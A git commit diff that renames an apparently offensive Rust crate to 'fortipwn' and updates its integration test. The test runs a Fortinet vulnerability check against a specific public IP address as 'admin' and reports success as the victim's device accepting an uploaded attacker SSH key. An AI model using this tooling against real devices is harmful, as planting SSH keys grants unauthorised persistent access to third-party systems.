ae7d297ddd606fc25052ca7d9f90fef34b3e3960
Grapphy <76534455+Grapphy@users.noreply.github.com>
2022-10-21 16:34:19 -0300

    Updating integration tests with new name

--- tests/integration_test.rs
+++ tests/integration_test.rs
@@ -1,4 +1,4 @@
-extern crate fortinet_devices;
+extern crate fortipwn;
 
 #[tokio::test]
 async fn test_check_vulnerabilty() -> Result<(), Box<dyn std::error::Error>> {
@@ -8,7 +8,7 @@ async fn test_check_vulnerabilty() -> Result<(), Box<dyn std::error::Error>> {
                    qCL/Fhb55UyhE+/bmnMTk+MIAK0HiNn+praMN/SvgpQApw7SVrMMUBr/N7SoxLx6AInUNt1UXQf77/C8
                    1ewGUoHSwR8wbi7KYrsdE27nirav4YZyf4X6jWBM1XYXEwNONp0o1TtNMiwh secret@secret"
         .to_string();
-    match cve::is_vulnerable("181.150.41.101", "admin", rsa_pub).await? {
+    match fortipwn::cve::is_vulnerable("181.150.41.101", "admin", rsa_pub).await? {
         true => println!("Service is VULNERABLE, id_rsa.pub uploaded"),
         false => println!("Service is not vulnerable"),
     };
